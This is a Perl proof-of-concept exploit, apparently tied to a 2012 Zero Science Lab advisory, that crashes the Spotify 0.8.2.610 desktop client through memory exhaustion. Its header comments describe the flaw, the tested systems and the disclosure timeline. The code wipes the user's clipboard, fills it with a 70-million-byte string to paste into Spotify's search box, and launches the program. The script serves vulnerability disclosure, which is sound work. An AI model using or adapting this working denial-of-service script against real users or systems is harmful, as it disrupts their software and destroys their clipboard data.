#!/usr/local/bin/perl
#
# Spotify 0.8.2.610 (search func) Memory Exhaustion Exploit
#
#
# Vendor: Spotify Ltd
# Product web page: http://www.spotify.com
# Affected version: 0.8.2.610.g090a06f8
#
# Summary: Think of Spotify as your new music collection. Your
# library. Only this time your collection is vast: millions of
# tracks and counting. Spotify comes in all shapes and sizes,
# available for your PC, Mac, home audio system and mobile phone.
# Wherever you go, your music follows you.
#
# Desc: The vulnerability is caused due to the Search box function
# not checking the boundary of user input. This can be exploited to
# cause a DoS due to memory exhaustion when inserting a long string
# of bytes (~80mil B / 80 MB) into the Search field in the GUI.
#
# Tested on: Microsoft Windows XP Professional SP3 (EN) (32bit)
#            Microsoft Windows 7 Ultimate SP1 (EN) (64bit)
#
# Vulnerability discovered by Claes Spett
# Coded by LiquidWorm
#
# Vendor status:
#
# [19.03.2012] Vulnerability discovered.
# [22.03.2012] Vendor has some knowledge about the issue.
# [23.03.2012] Public security advisory released.
#
#
# Advisory ID: ZSL-2012-5082
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5082.php
#
#
# 21.03.2012
#

use Win32::Clipboard; $leepy = Win32::Clipboard();
print "\n[i] Clearing your Clipboard data...\n";
sleep 2; print "\n - Done!\n"; sleep 1; $leepy->Empty();
$tring = "\x41" x 70000000; $leepy->Set($tring);
print "\n\n*----- Log In and just Paste \/ CTRL+V";
print " into the search box -----*\n\n";
system pause; print "\n\n[*] Starting Spotify\n"; sleep 1;
system('start C:\\Docume~1\\%username%\Applic~1\\Spotify\\spotify.exe');